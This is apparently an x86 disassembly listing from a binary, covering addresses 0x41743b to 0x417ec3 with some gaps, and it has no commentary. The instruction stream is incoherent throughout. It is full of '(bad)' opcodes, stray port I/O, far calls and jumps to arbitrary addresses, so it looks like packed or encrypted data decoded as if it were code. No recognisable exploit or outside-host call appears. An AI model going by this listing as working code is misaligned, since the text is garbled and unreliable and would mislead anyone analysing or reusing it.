  41743b:	dec    ebx
  41743c:	bnd jle 0x417415
  41743f:	jp     0x4173dc
  417441:	or     al,BYTE PTR [eax+0x46]
  417444:	xchg   ebp,eax
  417445:	inc    esi
  417446:	or     BYTE PTR [esi-0x9],al
  417449:	ret    
  41744a:	shr    edi,0x8b
  41744d:	and    al,0xc2
  41744f:	sub    ah,ch
  417451:	scas   eax,DWORD PTR es:[edi]
  417452:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417453:	out    dx,eax
  417454:	mov    bh,BYTE PTR [eax]
  417456:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417457:	iret   
  417458:	jg     0x41741d
  41745a:	mov    edx,0x503ec623
  41745f:	sub    dh,BYTE PTR [ecx]
  417461:	shr    BYTE PTR [eax+0x35],1
  417464:	loopne 0x41744f
  417466:	sbb    ebp,DWORD PTR [ebx+ebp*4]
  417469:	mov    BYTE PTR [edx+0x253a8e66],cl
  41746f:	jmp    0x41745a
  417471:	retf   0x89b1
  417474:	div    DWORD PTR [edx-0x3e]
  417477:	xor    al,0xc6
  417479:	loopne 0x41749e
  41747b:	xchg   esi,eax
  41747c:	mov    al,0xed
  41747e:	sbb    al,0x35
  417480:	and    DWORD PTR [edx-0x765d4706],ecx
  417486:	push   ss
  417487:	jns    0x41742c
  417489:	mov    es,WORD PTR [edx]
  41748b:	cld    
  41748c:	leave  
  41748d:	mov    DWORD PTR [ecx-0x29],esp
  417490:	sub    al,0x4f
  417492:	lods   al,BYTE PTR ds:[esi]
  417493:	fsubr  DWORD PTR [esi+0x79]
  417496:	mov    ds:0x8dd45774,eax
  41749b:	sub    BYTE PTR [ecx+0x3474fe3b],ch
  4174a1:	shl    BYTE PTR [esi-0x1b2c8cf0],1
  4174a7:	add    al,0xb4
  4174a9:	loop   0x417452
  4174ab:	sbb    al,0x7e
  4174ad:	je     0x417461
  4174af:	or     DWORD PTR es:[edi-0x758e774a],0xd0e34c6
  4174ba:	(bad)  
  4174bb:	lds    eax,FWORD PTR [ebx-0x1d067b6e]
  4174c1:	js     0x4174c3
	...
  417533:	add    BYTE PTR ds:0xfff32bd8,ah
  417539:	repz std 
  41753b:	fimul  WORD PTR [edx]
  41753d:	mov    edi,0x8daa3b7a
  417542:	aam    0x43
  417544:	mov    dh,bh
  417546:	add    BYTE PTR [eax],al
  417548:	test   BYTE PTR [eax],0x0
  41754b:	add    ah,al
  41754d:	push   esi
  41754e:	jmp    0xa38584f7
  417553:	sbb    ah,bh
  417555:	fwait
  417556:	xchg   ebp,eax
  417557:	mov    ah,0xf5
  417559:	dec    eax
  41755a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41755b:	xor    edx,DWORD PTR [ebx]
  41755d:	ins    BYTE PTR es:[edi],dx
  41755e:	test   DWORD PTR [ebp-0x7cdc4ef1],eax
  417564:	data16 mov cl,0x57
  417567:	mov    DWORD PTR ds:0x5a7b59c3,ecx
  41756d:	cld    
  41756e:	inc    ebx
  41756f:	push   ebx
  417570:	ret    
  417571:	pop    esp
  417572:	jne    0x4175e9
  417574:	mov    al,cs:0x95ec2606
  41757a:	dec    ebx
  41757b:	or     ecx,DWORD PTR [esp+edi*1-0x6763e8b2]
  417582:	(bad)  
  417583:	div    DWORD PTR ds:0xa26bb491
  417589:	call   0x65466b52
  41758e:	lods   al,BYTE PTR ds:[esi]
  41758f:	sub    BYTE PTR [ecx+0x41a0c976],ah
  417595:	int3   
  417596:	mov    es,edx
  417598:	repnz adc ah,dh
  41759b:	rcl    ah,0x83
  41759e:	jmp    0xc60257b3
  4175a3:	or     ah,ch
  4175a5:	xlat   BYTE PTR ds:[ebx]
  4175a6:	rcl    BYTE PTR [ebx-0x4f],cl
  4175a9:	cs pop ebp
  4175ab:	sbb    esi,esp
  4175ad:	add    eax,0x1cce37c3
  4175b2:	pusha  
  4175b3:	popa   
  4175b4:	pop    esi
  4175b5:	dec    esp
  4175b6:	jle    0x417581
  4175b8:	fstp   QWORD PTR [esi]
  4175ba:	rcl    edi,0x43
  4175bd:	inc    ecx
  4175be:	or     eax,0xa65e2ec
  4175c3:	xchg   ecx,eax
  4175c4:	cs ret 0x4a1
  4175c8:	inc    esi
  4175c9:	sbb    dl,BYTE PTR [eax+0x1]
  4175cc:	mov    cs,WORD PTR [ebx]
  4175ce:	out    0xde,eax
  4175d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4175d1:	leave  
  4175d2:	mov    bh,0x39
  4175d4:	call   0x28f9:0xd7d903d4
  4175db:	mov    eax,ds:0xb093a527
  4175e0:	jb     0x41759a
  4175e2:	(bad)  [ebp-0x140de427]
  4175e8:	test   DWORD PTR [esi],edx
  4175ea:	pop    edi
  4175eb:	mov    bl,0xb
  4175ed:	cmp    bh,BYTE PTR [esi-0x2c]
  4175f0:	shr    cl,0x5
  4175f3:	and    DWORD PTR [ebp-0x380ee384],ecx
  4175f9:	enter  0x657f,0xff
  4175fd:	loope  0x417612
  4175ff:	scas   eax,DWORD PTR es:[edi]
  417600:	imul   ecx,DWORD PTR [edi+0x349a1181],0x59
  417607:	adc    al,0x1d
  417609:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41760a:	out    0xfc,eax
  41760c:	popa   
  41760d:	add    BYTE PTR [esp+esi*4-0x5c63afd0],dl
  417614:	mov    edx,0xb87ab198
  417619:	inc    ebx
  41761a:	push   ds
  41761b:	and    cl,dl
  41761d:	xchg   ecx,eax
  41761e:	pop    ebx
  41761f:	icebp  
  417620:	ja     0x4175ef
  417622:	sub    al,0xa7
  417624:	or     al,0x68
  417626:	push   0x7
  417628:	cmp    al,0x45
  41762a:	xchg   edi,eax
  41762b:	(bad)  
  41762c:	imul   esi,DWORD PTR [edi-0x63],0xe9083558
  417633:	cmp    edi,esi
  417635:	xchg   edx,eax
  417636:	lods   eax,DWORD PTR ds:[esi]
  417637:	stc    
  417638:	bound  eax,QWORD PTR [edx-0x43]
  41763b:	fwait
  41763c:	ins    DWORD PTR es:[edi],dx
  41763d:	sahf   
  41763e:	push   ss
  41763f:	or     DWORD PTR [edx+esi*1+0x0],edx
	...
  4176b2:	add    BYTE PTR [eax],al
  4176b4:	(bad)  
  4176b5:	(bad)  
  4176b7:	(bad)  
  4176b8:	(bad)  
  4176ba:	out    0xff,eax
  4176bc:	xchg   BYTE PTR [eax],dh
  4176be:	jns    0x4176dd
  4176c0:	inc    ebx
  4176c1:	je     0x417728
  4176c3:	ret    0xff7e
  4176c6:	add    BYTE PTR [eax],al
  4176c8:	test   BYTE PTR [eax],0x0
  4176cb:	add    BYTE PTR [edi+0x6efe2b33],dl
  4176d1:	cmp    DWORD PTR [esi-0x29],edi
  4176d4:	or     ch,0xcb
  4176d7:	xchg   esi,eax
  4176d8:	outs   dx,DWORD PTR ds:[esi]
  4176d9:	test   DWORD PTR [ecx+0x50],edi
  4176dc:	sti    
  4176dd:	in     al,dx
  4176de:	lahf   
  4176df:	out    0x9c,eax
  4176e1:	cwde   
  4176e2:	mov    ch,0x41
  4176e4:	push   esi
  4176e5:	idiv   DWORD PTR ds:[ebp+ebx*1+0xf]
  4176ea:	xor    eax,0x738a53c0
  4176ef:	xor    eax,0x86d4d30c
  4176f4:	mov    al,0x4a
  4176f6:	scas   al,BYTE PTR es:[edi]
  4176f7:	sbb    bh,BYTE PTR [eax+edi*4+0x3c]
  4176fb:	(bad)  
  4176fc:	sub    al,0x2
  4176fe:	bound  ecx,QWORD PTR [esp+edx*2+0x35]
  417702:	and    ch,BYTE PTR [eax]
  417704:	xchg   esi,eax
  417705:	push   esi
  417706:	addr16 inc esi
  417708:	xor    al,0x19
  41770a:	(bad)  
  41770b:	adc    al,0xc0
  41770d:	push   es
  41770e:	pusha  
  41770f:	sub    eax,0xca6d2cd4
  417714:	rol    BYTE PTR [edx-0x46cd936a],cl
  41771a:	jne    0x41771e
  41771c:	ins    BYTE PTR es:[edi],dx
  41771d:	mov    ebp,DWORD PTR [ecx-0x5eb1df6]
  417723:	jnp    0x417786
  417725:	pop    ds
  417726:	jns    0x4176ba
  417728:	add    eax,0x44477c6
  41772d:	pop    edx
  41772e:	imul   edi,DWORD PTR [edx],0xd6cf479a
  417734:	aam    0x3a
  417736:	xor    esp,DWORD PTR [edi]
  417738:	and    BYTE PTR [eax],0x68
  41773b:	in     eax,0xb9
  41773d:	mov    al,0xb5
  41773f:	add    DWORD PTR [edx-0x69002206],esp
  417745:	popa   
  417746:	add    al,0xfd
  417748:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417749:	sub    al,0x79
  41774b:	icebp  
  41774c:	lahf   
  41774d:	addr16 (bad) 
  41774f:	pop    ebx
  417750:	adc    DWORD PTR [ecx-0x160c0f6c],edx
  417756:	shr    BYTE PTR [ebp-0x80],cl
  417759:	xchg   esp,eax
  41775a:	idiv   DWORD PTR [ecx+0x2b]
  41775d:	clc    
  41775e:	inc    ebp
  41775f:	lods   al,BYTE PTR ds:[esi]
  417760:	xor    DWORD PTR [bp+si],ebx
  417763:	popa   
  417764:	inc    esp
  417765:	sti    
  417766:	jl     0x417701
  417768:	fisttp WORD PTR [ecx]
  41776a:	adc    al,0x7a
  41776c:	frstor [eax]
  41776e:	mov    ebp,0x64eedf1
  417773:	cs sbb eax,0x563e30b4
  417779:	daa    
  41777a:	xor    bh,BYTE PTR [ebx-0x4f445926]
  417780:	inc    edx
  417781:	adc    eax,0x3a40508c
  417786:	addr16 rcl ax,1
  41778a:	sar    DWORD PTR [edi],0x39
  41778d:	fsubrp st(6),st
  41778f:	mov    edi,0x1e8657d6
  417794:	dec    ebp
  417795:	pmulhuw mm6,QWORD PTR [esi]
  417798:	outs   dx,BYTE PTR ds:[esi]
  417799:	je     0x4177b7
  41779b:	shr    DWORD PTR [ecx],1
  41779d:	cmp    al,0xda
  41779f:	add    eax,0x1209254e
  4177a4:	mov    edi,0x145cccc9
  4177a9:	sti    
  4177aa:	dec    esi
  4177ab:	fimul  DWORD PTR [edx]
  4177ad:	xchg   ecx,eax
  4177ae:	mov    al,ds:0xf43a2c50
  4177b3:	sub    bl,BYTE PTR [ebx]
  4177b5:	bound  ebx,QWORD PTR [edx-0x5b007fdd]
  4177bb:	in     eax,0xab
  4177bd:	and    cl,al
  4177bf:	cmc    
  4177c0:	into   
  4177c1:	mov    ch,0x0
	...
  417833:	add    cl,dl
  417835:	scas   eax,DWORD PTR es:[edi]
  417836:	push   es
  417837:	repz jle 0x417835
  41783a:	cmc    
  41783b:	scas   eax,DWORD PTR es:[edi]
  41783c:	mov    ebx,0xc57d6e99
  417841:	stos   DWORD PTR es:[edi],eax
  417842:	lea    esp,ds:0x10074
  417848:	test   BYTE PTR [eax],0x0
  41784b:	add    BYTE PTR [eax-0xc],al
  41784e:	mov    ebx,0x6e878165
  417853:	xor    DWORD PTR [ebp-0x5c],ebx
  417856:	cmp    cl,BYTE PTR [edx+0x1c3bffd1]
  41785c:	fdivr  QWORD PTR [edx+0x42ce46ec]
  417862:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417863:	test   DWORD PTR [ebx-0x2a],esp
  417866:	ja     0x417805
  417868:	push   edx
  417869:	cmp    DWORD PTR [edi],edi
  41786b:	test   eax,0x75ef7f5
  417870:	inc    esp
  417871:	imul   ebp,esp,0x62fff892
  417877:	xchg   esp,eax
  417878:	jne    0x41789d
  41787a:	pop    ds
  41787b:	jmp    0x417879
  41787d:	push   ecx
  41787e:	ins    BYTE PTR es:[edi],dx
  41787f:	aam    0xcb
  417881:	inc    ebp
  417882:	loopne 0x417887
  417884:	and    DWORD PTR ds:0x25a32892,0xffffffb5
  41788b:	outs   dx,DWORD PTR ds:[esi]
  41788c:	out    dx,eax
  41788d:	fs icebp 
  41788f:	neg    DWORD PTR [eax]
  417891:	out    0xbc,eax
  417893:	sub    BYTE PTR [edx+0x77eeffaa],al
  417899:	cmp    eax,0xd57012bb
  41789e:	add    esi,DWORD PTR [ebx+0x2a]
  4178a1:	loope  0x417853
  4178a3:	(bad)  
  4178a4:	mov    ch,0xbd
  4178a6:	js     0x41790a
  4178a8:	inc    ebp
  4178a9:	pop    ss
  4178aa:	into   
  4178ab:	jno    0x417841
  4178ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4178ae:	mov    ebx,0x2ee8ab83
  4178b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178b4:	aam    0x7a
  4178b6:	inc    esi
  4178b7:	mov    ebp,edi
  4178b9:	clc    
  4178ba:	fisttp DWORD PTR [edi+eax*8-0x72fd3fec]
  4178c1:	xchg   di,ax
  4178c3:	out    dx,al
  4178c4:	push   0xffffffef
  4178c6:	sub    BYTE PTR [ebx],dl
  4178c8:	mov    ah,0x5c
  4178ca:	sub    DWORD PTR [eax+edx*2+0x7ceb071b],ecx
  4178d1:	jl     0x4178ca
  4178d3:	add    eax,0x16f59be1
  4178d8:	mov    ah,0x6b
  4178da:	fcomp  QWORD PTR [ebx+0x39]
  4178dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4178de:	lds    eax,FWORD PTR [ebx+0x47c4d6cc]
  4178e4:	sbb    DWORD PTR [ebp-0x4f],eax
  4178e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178e8:	je     0x4178e7
  4178ea:	retf   
  4178eb:	add    ah,al
  4178ed:	mov    esi,0x45c3bdea
  4178f2:	mov    ebp,0x3a3312fb
  4178f7:	arpl   WORD PTR [ebx+0xa1aba00],bp
  4178fd:	and    esi,0x2c
  417900:	sbb    DWORD PTR [edi],edx
  417902:	ficom  DWORD PTR [edx-0x1d]
  417905:	push   ebx
  417906:	mov    eax,0x93ef4bfc
  41790b:	jg     0x4178b6
  41790d:	inc    edx
  41790e:	mov    ebp,0x4a1181b1
  417913:	arpl   WORD PTR [edx+0x38],bx
  417916:	sbb    BYTE PTR [ebp+0x6f],bl
  417919:	(bad)  
  41791a:	daa    
  41791b:	cli    
  41791c:	loope  0x41795b
  41791e:	mov    DWORD PTR [edx+0x6255d4ce],edi
  417924:	outs   dx,BYTE PTR ds:[esi]
  417925:	sub    ch,BYTE PTR [edx-0x62fa2e4d]
  41792b:	jg     0x417981
  41792d:	cmp    ebx,DWORD PTR [edi+edx*1-0x1a67a1cb]
  417934:	adc    ebx,eax
  417936:	pop    ecx
  417937:	outs   dx,DWORD PTR ds:[esi]
  417938:	in     eax,0x1
  41793a:	and    al,0x5
  41793c:	cmp    DWORD PTR [ebp+0xd80e493],0x0
	...
  4179b2:	add    BYTE PTR [eax],al
  4179b4:	retf   
  4179b5:	pusha  
  4179b6:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  4179bc:	lea    esi,[esi+0x50f1c980]
  4179c2:	xor    BYTE PTR [ebx],ah
  4179c4:	push   0x1
  4179c6:	add    DWORD PTR [eax],eax
  4179c8:	test   BYTE PTR [eax],0x0
  4179cb:	add    ah,dh
  4179cd:	inc    esi
  4179ce:	ins    BYTE PTR es:[edi],dx
  4179cf:	out    dx,eax
  4179d0:	sbb    DWORD PTR [edi],ebx
  4179d2:	inc    edi
  4179d3:	jle    0x417962
  4179d5:	ja     0x417a36
  4179d7:	inc    ebx
  4179d8:	xchg   ecx,eax
  4179d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4179da:	pop    ds
  4179db:	mov    al,0xb
  4179dd:	inc    edi
  4179de:	xchg   ebx,eax
  4179df:	cmp    esp,DWORD PTR [ebp+eiz*8-0x74]
  4179e3:	mov    ecx,0x8d6e02da
  4179e8:	cmc    
  4179e9:	(bad)  [edi]
  4179eb:	jbe    0x4179fe
  4179ed:	pop    esp
  4179ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179ef:	shl    BYTE PTR [ebx+0x51],1
  4179f2:	js     0x417a36
  4179f4:	inc    eax
  4179f5:	icebp  
  4179f6:	int3   
  4179f7:	xor    ebp,ebp
  4179f9:	pop    es
  4179fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4179fb:	and    dl,ah
  4179fd:	jge    0x417a53
  4179ff:	int    0xe9
  417a01:	addr16 jmp 0x4179dd
  417a04:	add    BYTE PTR [ebx],cl
  417a06:	pop    esi
  417a07:	lahf   
  417a08:	jle    0x417a63
  417a0a:	inc    esi
  417a0b:	mov    cl,0xa2
  417a0d:	aad    0xb8
  417a0f:	call   0x9c9c:0x1c86c1ae
  417a16:	mov    al,0xbe
  417a18:	pop    ebx
  417a19:	cmp    dl,BYTE PTR [ecx+esi*8]
  417a1c:	fiadd  WORD PTR [ebp-0x4a]
  417a1f:	mov    edx,0x9cc71f68
  417a24:	pop    es
  417a25:	std    
  417a26:	stos   BYTE PTR es:[edi],al
  417a27:	mov    ebx,0x296246ba
  417a2c:	and    ch,dl
  417a2e:	inc    ax
  417a30:	(bad)
  417a33:	sbb    DWORD PTR [edx+0x29b64c7d],0xdb27c412
  417a3d:	push   eax
  417a3e:	repz fwait
  417a40:	dec    esp
  417a41:	pop    eax
  417a42:	loope  0x4179cd
  417a44:	imul   edi,DWORD PTR [edi-0x36],0xc3a8e2c1
  417a4b:	loope  0x417a2f
  417a4d:	pop    eax
  417a4e:	gs add al,0x2c
  417a51:	cmc    
  417a52:	outs   dx,BYTE PTR ds:[esi]
  417a53:	out    0x55,al
  417a55:	cmp    DWORD PTR [edi],edx
  417a57:	retf   
  417a58:	mov    ebp,0x2b65429c
  417a5d:	and    DWORD PTR ds:0x8bbb8cce,edx
  417a63:	ss xor bl,al
  417a66:	nop
  417a67:	ss (bad) 
  417a69:	int    0xc8
  417a6b:	fwait
  417a6c:	dec    edx
  417a6d:	jnp    0x417aa1
  417a6f:	les    ebp,FWORD PTR [esp+ebp*2+0x56]
  417a73:	xor    edx,DWORD PTR [eax-0x6b1fbcdd]
  417a79:	xor    eax,0x6ccdd269
  417a7e:	mov    esi,0x5647b4f0
  417a83:	jae    0x417af7
  417a85:	sahf   
  417a86:	or     eax,0x23a02db2
  417a8b:	neg    DWORD PTR [ebp+0x6e29efb6]
  417a91:	nop
  417a92:	add    al,0x10
  417a94:	in     eax,dx
  417a95:	shl    DWORD PTR [ecx],0x5e
  417a98:	sbb    bl,dl
  417a9a:	int3   
  417a9b:	cwde   
  417a9c:	xchg   esi,eax
  417a9d:	xor    eax,0xf266f055
  417aa2:	pop    esi
  417aa3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417aa4:	sti    
  417aa5:	mov    al,ds:0x45017649
  417aaa:	or     bl,BYTE PTR [eax+esi*2+0x57a510e8]
  417ab1:	dec    ebx
  417ab2:	xchg   edi,eax
  417ab3:	dec    edx
  417ab4:	lods   eax,DWORD PTR ds:[esi]
  417ab5:	test   eax,0xd46b1b36
  417aba:	data16 fist WORD PTR ds:0x145122f1
  417ac1:	jno    0x417ac3
	...
  417b33:	add    bl,ah
  417b35:	gs push cs
  417b37:	test   DWORD PTR [esi+0x6a75fbff],0x64fef5f7
  417b41:	jecxz  0x417b53
  417b43:	mov    dh,0x60
  417b45:	add    al,BYTE PTR [ecx]
  417b47:	add    dh,dh
  417b49:	add    BYTE PTR [eax],al
  417b4b:	add    cl,bh
  417b4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b4e:	inc    esp
  417b4f:	jns    0x417b75
  417b51:	(bad)  
  417b52:	leave  
  417b53:	dec    ebx
  417b54:	dec    esi
  417b55:	mov    dh,0xfe
  417b57:	iret   
  417b58:	leave  
  417b59:	cmp    edx,DWORD PTR [ecx]
  417b5b:	into   
  417b5c:	pop    edx
  417b5d:	sub    DWORD PTR [edi+0x44],ebx
  417b60:	xchg   edi,eax
  417b61:	mov    ebp,0x86d903d0
  417b66:	test   al,0xfe
  417b68:	or     dh,BYTE PTR [edx+0x68]
  417b6b:	jp     0x417b67
  417b6d:	jnp    0x417b51
  417b6f:	xlat   BYTE PTR ds:[ebx]
  417b70:	shr    DWORD PTR [ebp-0x50],1
  417b73:	das    
  417b74:	cmc    
  417b75:	popa   
  417b76:	push   0xfffffff2
  417b78:	push   esp
  417b79:	ret    0x7e3
  417b7c:	jmp    0x417be7
  417b7e:	adc    ah,BYTE PTR [eax]
  417b80:	push   eax
  417b81:	js     0x417b07
  417b83:	mov    ds:0xcbe9b699,al
  417b88:	push   esp
  417b89:	adc    eax,0x6a067b02
  417b8e:	mov    edi,0x40a76640
  417b93:	(bad)  
  417b94:	stc    
  417b95:	xor    al,0x2
  417b97:	sub    al,0xe5
  417b99:	cwde   
  417b9a:	sti    
  417b9b:	jns    0x417bfa
  417b9d:	shl    BYTE PTR [esi],0x6e
  417ba0:	xor    al,0x8c
  417ba2:	es push ebx
  417ba4:	arpl   WORD PTR [ebx+0x1e08687f],si
  417baa:	pop    ecx
  417bab:	push   edi
  417bac:	clc    
  417bad:	lahf   
  417bae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417baf:	out    dx,eax
  417bb0:	adc    al,0x82
  417bb2:	mov    edx,0x99424449
  417bb7:	lods   eax,DWORD PTR ds:[esi]
  417bb8:	inc    ebp
  417bb9:	fidiv  DWORD PTR [edx+0x2ffc9102]
  417bbf:	and    esi,eax
  417bc1:	stc    
  417bc2:	xor    ebp,eax
  417bc4:	xor    al,0xbe
  417bc6:	pop    ebp
  417bc7:	sar    DWORD PTR [eax+0x3dd77809],cl
  417bcd:	imul   edi,DWORD PTR [esi+0x13],0x3
  417bd1:	shl    DWORD PTR [ebp+edx*8+0x9d8e819],1
  417bd8:	mov    bl,0x46
  417bda:	loope  0x417c1b
  417bdc:	in     eax,dx
  417bdd:	repz mov bl,0x45
  417be0:	outs   dx,BYTE PTR ds:[esi]
  417be1:	pop    ss
  417be2:	xor    eax,0xe256b771
  417be7:	ja     0x417bea
  417be9:	jl     0x417c3d
  417beb:	call   0xc64b:0x37cf3c08
  417bf2:	cmp    al,0x6
  417bf4:	mov    BYTE PTR ds:0x399925f7,al
  417bfa:	shl    DWORD PTR [eax+ecx*4],0xe8
  417bfe:	jmp    0x417bc6
  417c00:	out    0x73,al
  417c02:	in     eax,dx
  417c03:	pushf  
  417c04:	xor    DWORD PTR [ebp+0x28ce8eb1],eax
  417c0a:	scas   al,BYTE PTR es:[edi]
  417c0b:	fstp   DWORD PTR [edx-0x7a]
  417c0e:	xor    DWORD PTR [ebx],eax
  417c10:	sar    DWORD PTR [edi-0x6f],1
  417c13:	xor    edi,esp
  417c15:	dec    esi
  417c16:	mov    bl,0x4b
  417c18:	jle    0x417c5e
  417c1a:	clc    
  417c1b:	lahf   
  417c1c:	out    dx,eax
  417c1d:	mov    ah,0x6a
  417c1f:	dec    eax
  417c20:	jmp    0xcda902c0
  417c25:	fs inc ebx
  417c27:	arpl   WORD PTR [edx],dx
  417c29:	std    
  417c2a:	outs   dx,BYTE PTR ds:[esi]
  417c2b:	and    al,0x64
  417c2d:	dec    ecx
  417c2e:	imul   ebx,ebp,0xb37b8390
  417c34:	xor    BYTE PTR [ebx+0x48ca5fee],0x36
  417c3b:	fnstenv [esi+0x285aef27]
  417c41:	xor    eax,0x0
	...
  417cb2:	add    BYTE PTR [eax],al
  417cb4:	and    DWORD PTR [ebx-0x40445077],edx
  417cba:	daa    
  417cbb:	lahf   
  417cbc:	(bad)  
  417cbd:	jle    0x417d17
  417cbf:	sbb    DWORD PTR [eax],ebp
  417cc1:	inc    ebx
  417cc2:	ins    BYTE PTR es:[edi],dx
  417cc3:	out    dx,eax
  417cc4:	push   esi
  417cc5:	add    eax,DWORD PTR [ecx]
  417cc7:	add    dh,dh
  417cc9:	add    BYTE PTR [eax],al
  417ccb:	add    BYTE PTR [edi-0x5f8a81a6],dl
  417cd1:	stos   BYTE PTR es:[edi],al
  417cd2:	push   ebp
  417cd3:	push   0x1037756b
  417cd8:	dec    esp
  417cd9:	into   
  417cda:	frstor [edi]
  417cdc:	or     ch,BYTE PTR [ecx+0x7013507e]
  417ce2:	push   esp
  417ce3:	lods   al,BYTE PTR ds:[esi]
  417ce4:	(bad)  
  417ce5:	cmp    eax,edi
  417ce7:	ret    0xc2c7
  417cea:	pop    ebp
  417ceb:	push   ebx
  417cec:	jnp    0x417d00
  417cee:	cmp    eax,0x20bb87e2
  417cf3:	mov    al,ds:0x2e2350dc
  417cf8:	stos   DWORD PTR es:[edi],eax
  417cf9:	jmp    0x417c80
  417cfb:	pusha  
  417cfc:	cmc    
  417cfd:	pop    ebp
  417cfe:	xchg   esi,eax
  417cff:	cmp    BYTE PTR [edi+0x59],bh
  417d02:	mov    cs,WORD PTR [esi+0x1]
  417d05:	add    eax,edi
  417d07:	push   ecx
  417d08:	mov    edx,0x9e2faf9c
  417d0d:	add    BYTE PTR [esi],ch
  417d0f:	mov    dl,0x16
  417d11:	cmp    BYTE PTR [esi+0x13],ch
  417d14:	xchg   edx,eax
  417d15:	inc    eax
  417d16:	adc    edx,ecx
  417d18:	imul   esi,esi,0xc
  417d1b:	dec    edx
  417d1c:	icebp  
  417d1d:	jg     0x417cb9
  417d1f:	jae    0x417cb8
  417d21:	jmp    0xa671e286
  417d26:	into   
  417d27:	stc    
  417d28:	std    
  417d29:	fcmovbe st,st(1)
  417d2b:	ficom  DWORD PTR [ecx+0x4a]
  417d2e:	add    eax,0x6976b077
  417d33:	sub    cl,BYTE PTR [eax-0x7de474e2]
  417d39:	fbstp  TBYTE PTR [ebx]
  417d3b:	outs   dx,DWORD PTR ds:[esi]
  417d3c:	or     ah,BYTE PTR [eax+0x2e]
  417d3f:	aas    
  417d40:	add    eax,0x31934b48
  417d45:	pop    ebp
  417d46:	jmp    0x71c31ba4
  417d4b:	fs add esi,0xe3306b8e
  417d52:	xor    ecx,edi
  417d54:	aam    0xf6
  417d56:	xor    al,0x4f
  417d58:	cmp    eax,DWORD PTR [ebx-0x72]
  417d5b:	or     DWORD PTR [esi+0x2f],0x4eaf3de0
  417d62:	sbb    DWORD PTR [edi-0x31891bec],edx
  417d68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d69:	push   esi
  417d6a:	dec    eax
  417d6b:	(bad)  
  417d6d:	pop    edi
  417d6e:	push   ebp
  417d6f:	iret   
  417d70:	fstp   QWORD PTR [ebp-0x6]
  417d73:	out    dx,eax
  417d74:	and    bh,BYTE PTR [ecx+0x32]
  417d77:	imul   edx,DWORD PTR [edi+0x42a78c6b],0x49
  417d7e:	out    dx,al
  417d7f:	int    0x67
  417d81:	and    al,0x73
  417d83:	fcom   QWORD PTR [edx-0xeb012cb]
  417d89:	mov    eax,ds:0x1efdc50b
  417d8e:	es out 0xae,eax
  417d91:	inc    esi
  417d92:	(bad)  [ebx+0x1a]
  417d95:	add    eax,0x31dde392
  417d9a:	dec    ecx
  417d9b:	fistp  WORD PTR [ebx]
  417d9d:	dec    ecx
  417d9e:	and    eax,0x50ba27ac
  417da3:	dec    eax
  417da4:	dec    ebx
  417da5:	adc    BYTE PTR [ebx+eax*4-0x5f],bl
  417da9:	push   ebx
  417daa:	aaa    
  417dab:	push   es
  417dac:	in     al,0x0
  417dae:	and    DWORD PTR [edi-0x4a],ebx
  417db1:	test   bh,bh
  417db3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417db4:	js     0x417dc1
  417db6:	dec    ebp
  417db7:	adc    al,0xd
  417db9:	mov    cl,0x3d
  417dbb:	in     al,0x70
  417dbd:	shl    BYTE PTR gs:[edx],1
  417dc0:	push   esi
  417dc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
	...
  417e32:	add    BYTE PTR [eax],al
  417e34:	mov    edi,0xae6d8e19
  417e39:	(bad)  
  417e3a:	(bad)  
  417e3b:	(bad)  
  417e3d:	xlat   BYTE PTR ds:[ebx]
  417e3e:	aam    0xef
  417e40:	mov    esp,esp
  417e42:	sub    DWORD PTR [eax+0x1044c],esi
  417e48:	test   BYTE PTR [eax],0x0
  417e4b:	add    BYTE PTR ds:0xe1424da8,bh
  417e51:	in     al,0x13
  417e53:	imul   esi,DWORD PTR [ebp+0x1b1dd83c],0xf603c434
  417e5d:	push   eax
  417e5e:	(bad)  
  417e5f:	jae    0x417e7d
  417e61:	gs pop ds
  417e63:	push   es
  417e64:	aaa    
  417e65:	sub    eax,0x6bd886e5
  417e6a:	push   ss
  417e6b:	(bad)  
  417e6c:	mov    ebp,0xe7e23b6d
  417e71:	inc    esp
  417e72:	sti    
  417e73:	adc    DWORD PTR [edx+eax*4],edx
  417e76:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  417e78:	rcl    bh,cl
  417e7a:	inc    ebp
  417e7b:	fild   WORD PTR [esi+0x65]
  417e7e:	dec    esp
  417e7f:	adc    DWORD PTR [ebx-0x3d],ebp
  417e82:	sub    esp,edx
  417e84:	or     BYTE PTR [ecx],al
  417e86:	mov    dl,BYTE PTR [edx]
  417e88:	mov    al,ds:0x52a14900
  417e8d:	adc    al,0x64
  417e8f:	leave  
  417e90:	cli    
  417e91:	add    edx,DWORD PTR [ecx-0x4b030647]
  417e97:	sbb    BYTE PTR [esi+0x60],0xf0
  417e9b:	dec    eax
  417e9c:	test   DWORD PTR [eax+0x4d],esi
  417e9f:	lds    eax,FWORD PTR [ebx]
  417ea1:	inc    ebx
  417ea2:	fld    QWORD PTR [esi+0x54]
  417ea5:	inc    ebx
  417ea6:	sbb    edx,eax
  417ea8:	mov    WORD PTR [esi-0x5d04ccde],ss
  417eae:	inc    esp
  417eaf:	mov    edi,0xd0c62a8b
  417eb4:	aam    0x8c
  417eb6:	leave  
  417eb7:	into   
  417eb8:	enter  0x822b,0xb6
  417ebc:	sub    eax,0xcab33d7e
  417ec1:	jne    0x417ecb
  417ec3:	jne    0x417f2b
